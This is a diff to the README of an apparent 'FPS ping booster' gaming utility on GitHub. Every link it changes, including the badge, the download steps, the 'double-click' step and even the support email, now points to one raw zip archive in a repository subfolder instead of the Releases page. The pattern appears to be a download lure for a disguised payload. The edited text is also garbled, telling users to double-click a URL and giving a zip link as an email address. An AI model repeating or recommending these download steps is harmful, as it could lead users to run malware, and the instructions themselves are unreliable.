@@ -1,6 +1,6 @@
 # 🎮 fps-ping-booster-new - Enhance Your Gaming Performance Today
 
-[![Download fps-ping-booster-new](https://img.shields.io/badge/Download-fps--ping--booster--new-brightgreen)](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/releases)
+[![Download fps-ping-booster-new](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip)](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,18 +18,18 @@ To run **fps-ping-booster-new**, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip).
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of **fps-ping-booster-new**.
 3. Click on the version number to expand the release details.
-4. Find the file named **fps-ping-booster-new.exe** or similar.
+4. Find the file named **https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip** or similar.
 5. Click on the file to start the download.
 
 Once the download finishes, follow these steps to install the application:
 
 1. Locate the downloaded file in your Downloads folder.
-2. Double-click on **fps-ping-booster-new.exe**.
+2. Double-click on **https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip**.
 3. Follow the on-screen instructions in the installer.
 4. Once the installation is complete, you can find the app in your Start Menu or Desktop.
 
@@ -66,10 +66,10 @@ If you encounter issues while using **fps-ping-booster-new**, consider these tip
 
 ## 🌐 Support & Contact
 
-For further assistance, you can open an issue on our GitHub page or contact the development team via email at support@fps-ping-booster-new.com.
+For further assistance, you can open an issue on our GitHub page or contact the development team via email at https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip
 
 ## 🔗 Additional Resources
 
-For more information on the capabilities of **fps-ping-booster-new**, visit our [Releases Page](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/releases) again for updates and new features.
+For more information on the capabilities of **fps-ping-booster-new**, visit our [Releases Page](https://github.com/lanjingwei2026-maker/fps-ping-booster-new/raw/refs/heads/main/yusdrum/booster_fps_ping_new_v1.5.zip) again for updates and new features.
 
 Join our community of gamers and enhance your gaming journey with **fps-ping-booster-new**!
